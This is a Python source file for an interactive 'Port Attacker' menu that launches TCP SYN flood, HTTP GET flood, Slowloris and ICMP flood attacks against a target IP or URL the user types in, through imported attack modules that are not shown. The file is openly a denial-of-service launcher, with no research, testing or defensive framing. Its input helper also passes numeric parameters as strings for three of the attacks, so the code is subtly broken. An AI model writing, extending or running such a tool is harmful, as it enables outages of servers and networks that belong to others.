from modules.blitzsyn import BlitzSyn
from modules.webtsunami import WebTsunami
from modules.crawlslow import CrawlSlow
from modules.pingstorm import PingStorm


class Menu:
    """
    Menu for launching different types of network attacks.
    """


    def __init__(self):
        self.options = {
            "1": self.tcp_syn_flood,
            "2": self.http_get_flood,
            "3": self.slowloris_attack,
            "4": self.icmp_flood,
            "0": self.exit_menu,
        }
        self.running = True


    @staticmethod
    def display_menu():
        print("""
        === Port Attacker ===
        Choose an attack type:
        1. TCP SYN Flood (BlitzSyn)
        2. HTTP GET Flood (WebTsunami)
        3. Slowloris Attack (CrawlSlow)
        4. ICMP Flood (PingStorm)
        0. Exit
        """)


    def run(self):
        while self.running:
            self.display_menu()
            choice = input("Choose an option: ").strip()
            action = self.options.get(choice)
            if action:
                try:
                    action()
                except Exception as e:
                    print(f"An error occurred: {e}")
            else:
                print("Invalid choice. Please try again.")


    def tcp_syn_flood(self):
        ip, port, workers, packets = self._get_attack_params(
            ["Enter target IP: ", "Enter target port: ", "Number of processes: ", "Packets per process: "])
        attacker = BlitzSyn(ip, port)
        attacker.attack(workers=workers, packets_per_worker=packets)


    def http_get_flood(self):
        url, workers, duration = self._get_attack_params(
            ["Enter target URL: ", "Number of processes: ", "Attack duration (seconds): "], types=[str, int, int])
        attacker = WebTsunami(url)
        attacker.attack(workers=workers, duration=duration)


    def slowloris_attack(self):
        ip, port, workers, sockets = self._get_attack_params(
            ["Enter target IP: ", "Enter target port: ", "Number of processes: ", "Sockets per process: "])
        attacker = CrawlSlow(ip, port)
        attacker.attack(workers=workers, sockets_per_worker=sockets)


    def icmp_flood(self):
        ip, workers, packets = self._get_attack_params(
            ["Enter target IP: ", "Number of processes: ", "Packets per process: "])
        attacker = PingStorm(ip)
        attacker.attack(workers=workers, packets_per_worker=packets)


    @staticmethod
    def _get_attack_params(prompts, types=None):
        """
        Helper function to gather parameters for attacks.
        :param prompts: List of input prompts for the user.
        :param types: List of data types for conversion. Defaults to str if not provided.
        :return: List of user-provided inputs, cast to appropriate types.
        """
        if types is None:
            types = [str] * len(prompts)
        return [t(input(prompt)) for t, prompt in zip(types, prompts)]


    def exit_menu(self):
        print("Exiting program.")
        self.running = False
